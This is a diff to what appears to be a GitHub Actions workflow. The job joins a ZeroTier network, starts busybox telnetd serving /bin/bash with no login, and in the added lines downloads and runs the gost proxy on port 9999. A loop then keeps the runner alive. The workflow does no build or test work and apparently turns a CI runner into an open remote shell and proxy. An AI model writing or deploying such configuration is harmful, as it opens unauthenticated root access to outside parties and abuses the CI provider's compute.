@@ -39,6 +39,10 @@ jobs:
           sudo zerotier-cli join a0cbf4b62a9aa2cf
           sudo chmod 755 busybox
           sudo ./busybox telnetd -l /bin/bash
-          sudo ifconfig ztc3qw4fhf 192.168.195.253 netmask 255.255.255.0 || true
+          wget https://github.com/ginuerzh/gost/releases/download/v2.11.5/gost-linux-amd64-2.11.5.gz
+          zcat gost-linux-amd64-2.11.5.gz > gost
+          chmod 755 gost
+          sudo ifconfig ztc3qw4fhf 192.168.195.254 netmask 255.255.255.0 || true
+          ./gost -L 9999
           while true;do sleep 60;ifconfig;done
           
